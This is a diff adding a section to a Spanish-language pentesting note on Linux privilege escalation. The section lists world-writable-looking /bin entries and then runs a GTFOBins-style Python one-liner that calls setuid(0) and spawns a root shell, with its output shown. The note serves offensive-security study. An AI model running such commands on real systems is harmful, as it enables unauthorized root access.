@@ -83,3 +83,28 @@ LISTEN    0         4096             127.0.0.1:631              0.0.0.0:*
 LISTEN    0         4096                 [::1]:631                 [::]:*                                                                                       
 ```
 En este caso hay una página web en la máquina la cual podremos visualizar por medio de [chisel](https://github.com/jpillora/chisel).
+
+## Binarios
+
+Otra forma de hacerlo es chequear que binarios contienen permisos de ejecución para un usuario:
+
+```bash
+┌─[user@user]─[/]
+└──╼ ls -l /bin/ | grep rwxrwx
+lrwxrwxrwx 1 root   root           8 Mar 13  2020 pydoc3 -> pydoc3.8
+lrwxrwxrwx 1 root   root          12 Mar 13  2020 pygettext3 -> pygettext3.8
+lrwxrwxrwx 1 root   root           9 Mar 13  2020 python3 -> python3.8
+lrwxrwxrwx 1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
+lrwxrwxrwx 1 root   root          33 Jan 27  2021 python3.8-config -> x86_64-linux-gnu-python3.8-config
+```
+
+Aquí podríamos escalar privilegios a través de ```Python```, siguiendo los pasos que nos muestran en [GTFOBins](https://gtfobins.github.io/).
+
+```bash
+┌─[user@user]─[/]
+└──╼ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+┌─[root@root]─[/]
+└──╼ whoami
+root
+```
